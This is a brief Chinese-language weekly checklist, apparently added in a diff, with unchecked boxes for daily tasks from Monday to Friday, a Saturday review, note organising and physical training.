+【本周完成检查】
+[ ] 周一任务完成
+[ ] 周二任务完成
+[ ] 周三任务完成
+[ ] 周四任务完成
+[ ] 周五任务完成
+[ ] 周六复习完成
+[ ] 本周笔记整理完成
+[ ] 体能训练完成
